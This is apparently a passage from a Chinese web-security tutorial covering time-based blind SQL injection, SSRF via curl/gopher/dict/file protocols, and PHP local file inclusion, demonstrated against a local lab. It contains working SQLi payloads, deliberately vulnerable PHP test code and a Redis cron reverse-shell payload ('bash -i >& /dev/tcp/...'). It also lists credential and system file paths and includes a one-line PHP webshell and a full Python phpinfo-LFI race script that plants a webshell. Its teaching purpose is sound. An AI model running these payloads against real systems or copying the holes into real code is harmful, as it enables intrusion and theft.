+<p>判断表名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/sqli_blind.php?id=1&apos; and if((ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=108),sleep(5),0)%23</div><div class="line"></div><div class="line">分析:</div><div class="line">(select table_name from information_schema.tables where table_schema=database() limit 0,1）- 查询WEB应用程序当前连接的数据库下的第一个表名。</div><div class="line">↓</div><div class="line">mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1) - 截取表名的第一个字符。</div><div class="line">↓</div><div class="line">(ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=108) - 判断表名的第一个字符的ascii码等于108</div><div class="line">↓</div><div class="line">if((ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=108),sleep(5),0)</div><div class="line"></div><div class="line">判断WEB应用程序当前连接的数据库下第一个表名的第一个字符是否等于108，若是，则延迟5秒，否则返回0.</div></pre></td></tr></table></figure></p>
+<p><img src="/2018/11/13/Web/sql_time_blind04.png" alt="sql_time_blind04"></p>
+<p>判断字段名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/sqli_blind.php?id=1&apos; and if((ascii(mid((select column_name from information_schema.columns where table_name=&apos;lxhsec&apos; limit 0,1),1,1))=105),sleep(5),0)%23</div><div class="line"></div><div class="line">分析:</div><div class="line">(select column_name from information_schema.columns where table_name=&apos;lxhsec&apos; limit 0,1) - 查询WEB应用程序当前连接的数据库的lxhsec表的第一个字段名。</div><div class="line">↓</div><div class="line">mid((select column_name from information_schema.columns where table_name=&apos;lxhsec&apos; limit 0,1),1,1) - 截取字段名的第一个字符。</div><div class="line">↓</div><div class="line">(ascii(mid((select column_name from information_schema.columns where table_name=&apos;lxhsec&apos; limit 0,1),1,1))=105) - 字段名的第一个字符的ascii码等于105 </div><div class="line">↓</div><div class="line">if((ascii(mid((select column_name from information_schema.columns where table_name=&apos;lxhsec&apos; limit 0,1),1,1))=105),sleep(5),0)</div><div class="line"></div><div class="line">判断WEB应用程序当前连接的数据库下lxhsec表的第一个字段名的第一个字符是否等于108，若是，则延迟5秒，否则返回0.</div></pre></td></tr></table></figure></p>
+<p><img src="/2018/11/13/Web/sql_time_blind05.png" alt="sql_time_blind05"></p>
+<p>猜数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/sqli_blind.php?id=1&apos; and if((ascii(mid((select id from test.lxhsec limit 0,1),1,1))=49),sleep(5),0)%23</div><div class="line"></div><div class="line">分析:</div><div class="line">(select id from test.lxhsec limit 0,1) - 查询test数据库下lxhsec表下id字段的第一行数据。</div><div class="line">↓</div><div class="line">mid((select id from test.lxhsec limit 0,1),1,1) - 截取id数据的第一个字符。</div><div class="line">↓</div><div class="line">(ascii(mid((select id from test.lxhsec limit 0,1),1,1))=49) - id数据的第一个字符的ascii码等于49</div><div class="line">↓</div><div class="line">if((ascii(mid((select id from test.lxhsec limit 0,1),1,1))=49),sleep(5),0)</div><div class="line"></div><div class="line">判断WEB应用程序当前连接的数据库下lxhsec表的id字段的第一行数据的第一个字符是否等于49，若是，则延迟5秒，否则返回0.</div></pre></td></tr></table></figure></p>
+<p><img src="/2018/11/13/Web/sql_time_blind06.png" alt="sql_time_blind06"></p>
+<h2 id="SSRF（Server-Side-Request-Forgery）"><a href="#SSRF（Server-Side-Request-Forgery）" class="headerlink" title="SSRF（Server Side Request Forgery）"></a>SSRF（Server Side Request Forgery）</h2><p><strong>0x01 背景</strong><br>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</p>
+<p><strong>0x02 成因</strong><br>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容、加载指定地址的图片、下载等。</p>
+<p><strong>0x03 攻击类型</strong><br>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息。</p>
+<p>2.攻击运行在内网或本地的应用程序(比如溢出)。</p>
+<p>3.对内网web应用进行指纹识别，通过访问默认文件实现。</p>
+<p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击(比如struts2，sqli等)。</p>
+<p>5.利用file协议读取本地文件等。</p>
+<p><strong>0x04 漏洞挖掘</strong><br>漏洞挖掘方法分为两种：</p>
+<p><strong>从WEB功能上寻找</strong></p>
+<hr>
+<p>常见WEB功能：</p>
+<p>1）分享：通过URL地址分享网页内容</p>
+<p>2）转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p>
+<p>3）在线翻译：通过URL地址翻译对应文本的内容。</p>
+<p>4）图片加载与下载：通过URL地址加载或下载图片。</p>
+<p>5）图片、文章收藏功能</p>
+<p><strong>从URL关键字寻找</strong></p>
+<hr>
+<p>常见URL关键字：</p>
+<p>share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain</p>
+<p><strong>0x05 利用方式</strong></p>
+<p>测试代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//ssrf.php</span></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// 创建一个新cURL资源</span></div><div class="line">$ch = curl_init();</div><div class="line"></div><div class="line"><span class="comment">// 设置URL和相应的选项</span></div><div class="line">curl_setopt($ch, CURLOPT_URL, $_GET[<span class="string">'url'</span>]);</div><div class="line"></div><div class="line"><span class="comment">//CURLOPT_RETURNTRANSFER为TRUE时, curl_exec()获取的信息以字符串返回，而不是直接输出。</span></div><div class="line"><span class="comment">//curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE); </span></div><div class="line"></div><div class="line"><span class="comment">// 当CURLOPT_RETURNTRANSFER为TRUE时, 函数执行成功时会返回执行的结果，失败时返回 FALSE 。</span></div><div class="line">curl_exec($ch); <span class="comment">// 执行</span></div><div class="line">curl_close($ch);<span class="comment">//关闭资源</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>上述代码用来模拟ssrf，使用curl发起网络请求然后返回客户端，这里我请求加载百度，<br><img src="/2018/11/13/Web/ssrf1.png" alt="ssrf1"></p>
+<p>curl支持的协议</p>
+<p><img src="/2018/11/13/Web/ssrf2.png" alt="ssrf2"></p>
+<p>可以看到该版本的curl支持很多协议，其中gopher协议、dict协议、file协议、http/s协议用的比较多</p>
+<p>http/https:主要用来探测内网服务。根据响应的状态判断内网端口及服务.</p>
+<p>除了http/https，还有一些可利用的协议如下:</p>
+<p>file://  - 读取文件内容</p>
+<p>上述测试代码有回显，因此浏览器直接访问,就可以看到文件内容了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.31.132/ssrf.php?url=file://E:/www/ssrf.php</div></pre></td></tr></table></figure>
+<p><img src="/2018/11/13/Web/ssrf_file.png" alt="ssrf_file.png"></p>
+<p>dict://  - 获得Banner</p>
+<p>同理，看redis相关配置，直接访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.31.132/ssrf.php?url=dict://192.168.31.232:6379/info</div></pre></td></tr></table></figure>
+<p><img src="/2018/11/13/Web/ssrf_dict.png" alt="ssrf_dict.png"></p>
+<p>如果在测试代码中ssrf.php加上一行代码屏蔽回显，</p>
+<pre><code>curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE); 
+</code></pre><p>那么dict只能通过NC 来获取信息了，file协议则利用不了。</p>
+<p><img src="/2018/11/13/Web/dict_nodisplay.png" alt="dict_nodisplay.png"></p>
+<p>Gopher://</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line">root@kali:~# socat -v tcp-listen:4444,fork tcp-connect:localhost:6379</div><div class="line">&gt; 2018/12/08 04:24:43.612115  length=83 from=0 to=82</div><div class="line">*3\r</div><div class="line">$3\r</div><div class="line">set\r</div><div class="line">$1\r</div><div class="line">1\r</div><div class="line">$56\r</div><div class="line"></div><div class="line"></div><div class="line">*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1</div><div class="line"></div><div class="line"></div><div class="line">\r</div><div class="line">&lt; 2018/12/08 04:24:43.614398  length=5 from=0 to=4</div><div class="line">+OK\r</div><div class="line">&gt; 2018/12/08 04:24:43.627531  length=57 from=0 to=56</div><div class="line">*4\r</div><div class="line">$6\r</div><div class="line">config\r</div><div class="line">$3\r</div><div class="line">set\r</div><div class="line">$3\r</div><div class="line">dir\r</div><div class="line">$16\r</div><div class="line">/var/spool/cron/\r</div><div class="line">&lt; 2018/12/08 04:24:43.629104  length=5 from=0 to=4</div><div class="line">+OK\r</div><div class="line">&gt; 2018/12/08 04:24:43.643591  length=52 from=0 to=51</div><div class="line">*4\r</div><div class="line">$6\r</div><div class="line">config\r</div><div class="line">$3\r</div><div class="line">set\r</div><div class="line">$10\r</div><div class="line">dbfilename\r</div><div class="line">$4\r</div><div class="line">root\r</div><div class="line">&lt; 2018/12/08 04:24:43.645492  length=5 from=0 to=4</div><div class="line">+OK\r</div><div class="line">&gt; 2018/12/08 04:24:43.653863  length=14 from=0 to=13</div><div class="line">*1\r</div><div class="line">$4\r</div><div class="line">save\r</div><div class="line">&lt; 2018/12/08 04:24:43.663545  length=5 from=0 to=4</div><div class="line">+OK\r</div><div class="line">&gt; 2018/12/08 04:24:43.677708  length=14 from=0 to=13</div><div class="line">*1\r</div><div class="line">$4\r</div><div class="line">quit\r</div><div class="line">&lt; 2018/12/08 04:24:43.678333  length=5 from=0 to=4</div><div class="line">+OK\r</div></pre></td></tr></table></figure>
+<p>除了curl_exec之外，还有file_get_contents，fsockopen等函数，使用不当都可以造成SSRF漏洞，示例代码如下:</p>
+<p>file_get_contents:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$url = $_GET[<span class="string">'url'</span>];	</div><div class="line">	$result = file_get_contents($url);</div><div class="line">	<span class="keyword">echo</span> $result;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p><img src="/2018/11/13/Web/ssrf5.png" alt="ssrf5"></p>
+<h2 id="文件包含（File-include）"><a href="#文件包含（File-include）" class="headerlink" title="文件包含（File include）"></a>文件包含（File include）</h2><p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行。<br>如果被包含的文件中无有效的php代码，则会直接把文件内容输出。</p>
+<p><strong>文件包含函数</strong><br>PHP中文件包含函数有以下四种：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">require()</div><div class="line">require_once()</div><div class="line">include()</div><div class="line">include_once()</div><div class="line"></div><div class="line">include和require区别主要是，</div><div class="line">include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；</div><div class="line">而require函数出现错误的时候，会直接报错并退出程序的执行。</div><div class="line"></div><div class="line">include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，</div><div class="line">适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</div></pre></td></tr></table></figure></p>
+<p><strong>漏洞产生原因</strong><br>文件包含函数加载的参数没有经过过滤，可以被用户控制。</p>
+<p>示例代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    $filename  = $_GET[<span class="string">'filename'</span>];</div><div class="line">    <span class="keyword">include</span>($filename);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>例如：<br>include函数加载的filename参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改filename参数的值，执行非预期的操作。</p>
+<h3 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a><strong>本地文件包含漏洞</strong></h3><p>无限制本地包含漏洞<br>测试代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    $filename  = $_GET[<span class="string">'filename'</span>];</div><div class="line">    <span class="keyword">include</span>($filename);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>测试结果：<br><img src="/2018/11/13/Web/include1.png" alt="include1"></p>
+<p>可以根据敏感文件的默认路径进行读取。<br>常见的敏感信息路径：</p>
+<p>Windows系统<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">c:\boot.ini // 查看系统版本</div><div class="line"></div><div class="line">c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件</div><div class="line"></div><div class="line">c:\windows\repair\sam // 存储Windows系统初次安装的密码</div><div class="line"></div><div class="line">c:\ProgramFiles\mysql\my.ini // MySQL配置</div><div class="line"></div><div class="line">c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码</div><div class="line"></div><div class="line">c:\windows\php.ini // php 配置信息</div></pre></td></tr></table></figure></p>
+<p>Linux/Unix系统<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">/etc/passwd // 账户信息</div><div class="line"></div><div class="line">/etc/shadow // 账户密码文件</div><div class="line"></div><div class="line">/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件</div><div class="line"></div><div class="line">/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置</div><div class="line"></div><div class="line">/usr/local/app/php5/lib/php.ini // PHP相关配置</div><div class="line"></div><div class="line">/etc/httpd/conf/httpd.conf // Apache配置文件</div><div class="line"></div><div class="line">/etc/my.conf // mysql 配置文件</div></pre></td></tr></table></figure></p>
+<p><strong>利用Apache日志</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">apache日志分为access.log与error.log，</div><div class="line">当我们请求一个Web应用程序url地址时，便会记录在access.log中，</div><div class="line">但是写入到access.log文件中url是被编码的，</div><div class="line">所以需要抓包绕过,且需要知道access.log的地址,才能配合文件包含漏洞。</div></pre></td></tr></table></figure></p>
+<p><img src="/2018/11/13/Web/Apache_log_LFI.png" alt="Apache_log_LFI"></p>
+<p>用burp抓包写，绕过编码。<br><img src="/2018/11/13/Web/Apache_log_LFI1.png" alt="Apache_log_LFI"></p>
+<p><img src="/2018/11/13/Web/Apache_log_LFI2.png" alt="Apache_log_LFI"></p>
+<p><a href="https://wiki.apache.org/httpd/DistrosDefaultLayout" target="_blank" rel="external">Apache默认配置文件路径</a></p>
+<p><strong>session文件包含漏洞</strong><br>利用条件：<br>1.session的存储位置可以获取。<br>2.session中的内容可以被用户控制，传入恶意代码。</p>
+<p>1.1.通过phpinfo的信息可以获取到session的存储位置。</p>
+<p>通过phpinfo的信息，获取到session.save_path为C:\Program Files\phpStudy\tmp\tmp;<br><img src="/2018/11/13/Web/Session_include1.png" alt="Session_include1"></p>
+<p>1.2.通过猜测默认的Session存放位置进行尝试。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Linux：</div><div class="line">/tmp 或 /var/lib/php/session</div><div class="line"></div><div class="line">Windows：</div><div class="line">C:\WINDOWS\Temp</div></pre></td></tr></table></figure>
+<p>测试代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	session_start();</div><div class="line">	$_SESSION[<span class="string">"username1"</span>]=$_GET[<span class="string">'user'</span>];</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>测试结果:<br><img src="/2018/11/13/Web/Session_include2.png" alt="Session_include2"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1.session的文件格式为sess_+PHPSESSID,PHPSESSID可以抓取请求数据包获得。</div><div class="line">2.在名为sess_+PHPSESSID文件中，会存储$_SESSION[&quot;username&quot;]的键，以及值(值是用户可以控制的，攻击者可以插入任意代码。)。</div></pre></td></tr></table></figure>
+<p>利用：攻击者通过phpinfo()信息泄露或者猜测能获取到session存放的位置，文件名称通过开发者模式可获取到，然后通过文件包含的漏洞解析恶意代码getshell。(前提是你能够控制session的值)<br><img src="/2018/11/13/Web/Session_include3.png" alt="Session_include3"></p>
+<p><strong>临时文件包含</strong></p>
+<p>向服务器上任意php文件post请求 上传文件时，都会生成临时文件，可以直接在phpinfo页面找到临时文件的路径及名字。</p>
+<p>在HTTP协议中为了方便进行文件传输，规定了一种基于表单的 HTML文件传输方法</p>
+<p>其中要确保文件上传表单的属性是 enctype=”multipart/form-data”，否则文件上传不了。</p>
+<p>PHP引擎对enctype=”multipart/form-data”这种请求的处理过程如下：</p>
+<p>1.请求到达<br>2.创建临时文件，并写入上传文件的内容<br>3.调用相应PHP脚本进行处理，如校验名称、大小等<br>4.删除临时文件</p>
+<p>PHP引擎会首先将文件内容保存到临时文件，然后进行相应的操作。<br>临时文件的名称是 php+随机字符。</p>
+<p>在PHP中，有超全局变量$_FILES,保存上传文件的信息，包括文件名、类型、临时文件名、错误代号、大小等。</p>
+<p>1.手工测试phpinfo()获取临时文件路径</p>
+<p>文件 upload.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;!doctype html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;body&gt;</div><div class="line">    &lt;form action=&quot;phpinfo.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</div><div class="line">    &lt;h3&gt; Test upload tmp file&lt;/h3&gt;</div><div class="line">    &lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;</div><div class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot;/&gt;&lt;br/&gt;</div><div class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
+<p>浏览器访问 upload.html, 上传文件 file.txt<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">//file.txt</div><div class="line">&lt;?php @eval($_POST[&apos;a&apos;]);?&gt;</div></pre></td></tr></table></figure></p>
+<p>跳转到phpinfo页面，可以看到临时文件信息,得到tmp_name 路径。<br><img src="/2018/11/13/Web/phpinfoinclude.png" alt="phpinfoinclude"></p>
+<p>当我们去此路径看的时候，会发现文件不存在，是因为php已经完成了它对上传文件的操作，已经删除了临时文件，因此我们手工的去包含，速度上来说肯定是不够的。</p>
+<p>网上随便找了个dalao的脚本，改了个python3，代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding: utf-8</span></div><div class="line"></div><div class="line"><span class="string">'''</span></div><div class="line"><span class="string">可能需要你改的几个地方：</span></div><div class="line"><span class="string">1、host</span></div><div class="line"><span class="string">2、port</span></div><div class="line"><span class="string">3、request中的phpinfo页面名字及路径</span></div><div class="line"><span class="string">4、hello_lfi() 函数中的url，即存在lfi的页面和参数</span></div><div class="line"><span class="string">5、如果不成功或报错，尝试增加padding长度到7000、8000试试</span></div><div class="line"><span class="string">6、某些开了magic_quotes_gpc或者其他东西不能%00的，自行想办法截断并在（4）的位置对应修改</span></div><div class="line"><span class="string"> Good Luck :)</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">'''</span></div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> time </div><div class="line"></div><div class="line">host = <span class="string">'127.0.0.1'</span></div><div class="line">port = <span class="number">80</span></div><div class="line"><span class="comment"># t = int(time.time())</span></div><div class="line">shell_name = hashlib.md5(host.encode(<span class="string">'utf-8'</span>)).hexdigest() + <span class="string">'.php'</span></div><div class="line">pattern = re.compile(<span class="string">r'''\[tmp_name\]\s=&amp;gt;\s(.*)\W*error]'''</span>)</div><div class="line"></div><div class="line">payload = <span class="string">'''idwar&lt;?php fputs(fopen('./'''</span> + shell_name + <span class="string">'''\',"w"),"idwar was here&lt;?php eval(\$_POST[a]);?&gt;")?&gt;\r'''</span></div><div class="line">req = <span class="string">'''-----------------------------7dbff1ded0714\r</span></div><div class="line"><span class="string">Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r</span></div><div class="line"><span class="string">Content-Type: text/plain\r</span></div><div class="line"><span class="string">\r</span></div><div class="line"><span class="string">%s</span></div><div class="line"><span class="string">-----------------------------7dbff1ded0714--\r'''</span> % payload</div><div class="line"></div><div class="line">padding=<span class="string">'A'</span> * <span class="number">7000</span></div><div class="line">request=<span class="string">'''POST /phpinfo.php?a='''</span>+padding+<span class="string">''' HTTP/1.0\r</span></div><div class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie='''</span>+padding+<span class="string">'''\r</span></div><div class="line"><span class="string">HTTP_ACCEPT: '''</span> + padding + <span class="string">'''\r</span></div><div class="line"><span class="string">HTTP_USER_AGENT: '''</span> + padding + <span class="string">'''\r</span></div><div class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: '''</span> + padding + <span class="string">'''\r</span></div><div class="line"><span class="string">HTTP_PRAGMA: '''</span> + padding + <span class="string">'''\r</span></div><div class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span></div><div class="line"><span class="string">Content-Length: %s\r</span></div><div class="line"><span class="string">Host: %s\r</span></div><div class="line"><span class="string">\r</span></div><div class="line"><span class="string">%s'''</span> % (len(req), host, req)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_lfi</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">        s = socket(AF_INET, SOCK_STREAM)</div><div class="line">        s.connect((host, port))</div><div class="line">        s.send(request.encode())</div><div class="line">        data = <span class="string">''</span></div><div class="line">        <span class="keyword">while</span> <span class="string">r'&lt;/body&gt;&lt;/html&gt;'</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</div><div class="line">            data = s.recv(<span class="number">9999</span>).decode(<span class="string">'utf8'</span>)</div><div class="line">            search_ = re.search(pattern, data)</div><div class="line">            <span class="keyword">if</span> search_:</div><div class="line">                tmp_file_name = search_.group(<span class="number">1</span>)</div><div class="line">                <span class="comment"># url = r'http://127.0.0.1/fileinclude.php?filename=%s%%00' % tmp_file_name</span></div><div class="line">                url = <span class="string">r'http://127.0.0.1/fileinclude.php?filename=%s'</span> % tmp_file_name</div><div class="line">                print(url)</div><div class="line">                html_data = requests.get(url).text</div><div class="line">                <span class="keyword">if</span> <span class="string">'idwar'</span> <span class="keyword">in</span> html_data:</div><div class="line">                    s.close()</div><div class="line">                    <span class="keyword">return</span> <span class="string">'\nDone. Your webshell is : \n\n%s\n'</span> % (<span class="string">'http://'</span> + host + <span class="string">'/'</span> + shell_name)</div><div class="line">        s.close()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">print</span> (hello_lfi())</div><div class="line">    <span class="keyword">print</span> (<span class="string">'\n Good Luck :)'</span>)</div></pre></td></tr></table></figure>
+<p>测试结果:<br><img src="/2018/11/13/Web/phpinfoinclude2.png" alt="phpinfoinclude2"></p>
+<p><strong>有限制本地文件包含漏洞绕过</strong></p>
+<p>%00截断<br>条件：magic_quotes_gpc = Off  php版本&lt;5.3.4</p>
+<p>%00 空字符，magic_quotes_gpc为On的情况下会将空字符进行转义，导致漏洞利用失败。php 5.3.4之后修复了这一漏洞。</p>
+<p>测试代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    $filename  = $_GET[<span class="string">'filename'</span>];</div><div class="line">    <span class="keyword">include</span>($filename . <span class="string">".html"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>测试结果<br><img src="/2018/11/13/Web/include2.png" alt="include2"></p>
+<p>用Burp Fuzz 发现只有%00才能截断。<br><img src="/2018/11/13/Web/include3.png" alt="include3"></p>
+<p>路径长度截断<br>条件：php版本小于5.3可以成功（my 5.3版本测试失败），windows OS，参数值总长度需要长于255；linux OS 长于4095</p>
+<p>Windows下目录最大长度为255字节，超出的部分会被丢弃；</p>
+<p>Linux下目录最大长度为4095字节，超出的部分会被丢弃。</p>
